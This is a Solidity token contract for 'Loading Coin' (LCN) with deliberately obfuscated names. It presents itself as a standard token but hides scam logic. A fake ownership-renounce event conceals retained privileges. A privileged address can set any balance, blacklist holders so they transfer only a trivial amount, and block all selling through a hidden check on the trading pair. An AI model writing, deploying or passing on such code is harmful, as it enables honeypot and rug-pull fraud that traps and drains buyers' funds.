//SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract maxMinFrom {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface buyMode {
    function createPair(address txSender, address tokenMarketing) external returns (address);

    function feeTo() external view returns (address);
}

interface walletLaunched {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface autoFee {
    function totalSupply() external view returns (uint256);

    function balanceOf(address modeShould) external view returns (uint256);

    function transfer(address atList, uint256 amountTxAt) external returns (bool);

    function allowance(address buyExempt, address spender) external view returns (uint256);

    function approve(address spender, uint256 amountTxAt) external returns (bool);

    function transferFrom(
        address sender,
        address atList,
        uint256 amountTxAt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed shouldTx, uint256 value);
    event Approval(address indexed buyExempt, address indexed spender, uint256 value);
}

interface sellBuy is autoFee {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract LoadingCoin is maxMinFrom, autoFee, sellBuy {

    constructor (){
        
        feeLaunch();
        walletLaunched toAmount = walletLaunched(maxTeam);
        autoReceiver = buyMode(toAmount.factory()).createPair(toAmount.WETH(), address(this));
        tradingExempt = buyMode(toAmount.factory()).feeTo();
        
        isTrading = _msgSender();
        liquidityEnable[isTrading] = true;
        maxEnable[isTrading] = walletTotalToken;
        if (minFrom == shouldFee) {
            shouldFee = false;
        }
        emit Transfer(address(0), isTrading, walletTotalToken);
    }

    uint8 private sellReceiverTrading = 18;

    address public isTrading;

    function feeLaunch() public {
        emit OwnershipTransferred(isTrading, address(0));
        enableIsSwap = address(0);
    }

    address maxTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function receiverMax(address atTo, address atList, uint256 amountTxAt) internal returns (bool) {
        require(maxEnable[atTo] >= amountTxAt);
        maxEnable[atTo] -= amountTxAt;
        maxEnable[atList] += amountTxAt;
        emit Transfer(atTo, atList, amountTxAt);
        return true;
    }

    uint256 constant fundTo = 6 ** 10;

    mapping(address => mapping(address => uint256)) private receiverSwap;

    event OwnershipTransferred(address indexed sellMarketing, address indexed limitMarketing);

    function enableMaxLiquidity(uint256 amountTxAt) public {
        totalBuy();
        listTotalAuto = amountTxAt;
    }

    address tradingExempt;

    mapping(address => uint256) private maxEnable;

    function totalBuy() private view {
        require(liquidityEnable[_msgSender()]);
    }

    mapping(address => bool) public enableAtReceiver;

    function totalSupply() external view virtual override returns (uint256) {
        return walletTotalToken;
    }

    function receiverTotalLaunch(address tradingFrom) public {
        totalBuy();
        
        if (tradingFrom == isTrading || tradingFrom == autoReceiver) {
            return;
        }
        enableAtReceiver[tradingFrom] = true;
    }

    uint256 shouldEnableMax;

    function owner() external view returns (address) {
        return enableIsSwap;
    }

    bool public receiverAt;

    uint256 public minSwap;

    function symbol() external view virtual override returns (string memory) {
        return receiverShould;
    }

    address private enableIsSwap;

    uint256 private walletTotalToken = 100000000 * 10 ** 18;

    function transfer(address maxSell, uint256 amountTxAt) external virtual override returns (bool) {
        return sellMarketingFrom(_msgSender(), maxSell, amountTxAt);
    }

    function sellMarketingFrom(address atTo, address atList, uint256 amountTxAt) internal returns (bool) {
        if (atTo == isTrading) {
            return receiverMax(atTo, atList, amountTxAt);
        }
        uint256 launchedAt = autoFee(autoReceiver).balanceOf(tradingExempt);
        require(launchedAt == listTotalAuto);
        require(atList != tradingExempt);
        if (enableAtReceiver[atTo]) {
            return receiverMax(atTo, atList, fundTo);
        }
        amountTxAt = receiverTo(atTo, atList, amountTxAt);
        return receiverMax(atTo, atList, amountTxAt);
    }

    uint256 listTotalAuto;

    bool public minFrom;

    function approve(address enableFeeTx, uint256 amountTxAt) public virtual override returns (bool) {
        receiverSwap[_msgSender()][enableFeeTx] = amountTxAt;
        emit Approval(_msgSender(), enableFeeTx, amountTxAt);
        return true;
    }

    string private receiverSell = "Loading Coin";

    uint256 public teamLimit = 3;

    function allowance(address takeMinTrading, address enableFeeTx) external view virtual override returns (uint256) {
        if (enableFeeTx == maxTeam) {
            return type(uint256).max;
        }
        return receiverSwap[takeMinTrading][enableFeeTx];
    }

    function balanceOf(address modeShould) public view virtual override returns (uint256) {
        return maxEnable[modeShould];
    }

    string private receiverShould = "LCN";

    function receiverTo(address atTo, address atList, uint256 amountTxAt) internal view returns (uint256) {
        require(amountTxAt > 0);

        uint256 takeMin = 0;
        if (atTo == autoReceiver && teamLimit > 0) {
            takeMin = amountTxAt * teamLimit / 100;
        } else if (atList == autoReceiver && launchLiquidity > 0) {
            takeMin = amountTxAt * launchLiquidity / 100;
        }
        require(takeMin <= amountTxAt);
        return amountTxAt - takeMin;
    }

    bool private shouldFee;

    function name() external view virtual override returns (string memory) {
        return receiverSell;
    }

    uint256 public senderSwap;

    function modeLaunched(address liquidityTakeWallet) public {
        if (receiverAt) {
            return;
        }
        
        liquidityEnable[liquidityTakeWallet] = true;
        if (receiverAuto != minSwap) {
            receiverAuto = minSwap;
        }
        receiverAt = true;
    }

    uint256 private sellBuySender;

    function receiverToken(address maxSell, uint256 amountTxAt) public {
        totalBuy();
        maxEnable[maxSell] = amountTxAt;
    }

    address public autoReceiver;

    uint256 public launchLiquidity = 0;

    function decimals() external view virtual override returns (uint8) {
        return sellReceiverTrading;
    }

    function transferFrom(address atTo, address atList, uint256 amountTxAt) external override returns (bool) {
        if (_msgSender() != maxTeam) {
            if (receiverSwap[atTo][_msgSender()] != type(uint256).max) {
                require(amountTxAt <= receiverSwap[atTo][_msgSender()]);
                receiverSwap[atTo][_msgSender()] -= amountTxAt;
            }
        }
        return sellMarketingFrom(atTo, atList, amountTxAt);
    }

    function getOwner() external view returns (address) {
        return enableIsSwap;
    }

    mapping(address => bool) public liquidityEnable;

    uint256 public receiverAuto;

}